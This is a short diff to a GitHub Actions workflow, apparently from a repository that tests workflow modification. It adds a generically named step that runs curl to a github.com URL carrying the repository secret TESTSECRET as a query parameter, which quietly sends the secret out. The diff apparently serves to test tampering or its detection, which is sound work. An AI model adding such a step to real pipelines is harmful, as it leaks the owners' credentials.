@@ -13,5 +13,7 @@ jobs:
         uses: actions/checkout@master
       - name: Generic Run Command
         run: date
+      - name: Generic curl Command
+        run: curl https://github.com/Anton0/workflow_modification_testing?oops=${super_secret}
     env: # Or as an environment variable
       super_secret: ${{ secrets.TESTSECRET }}
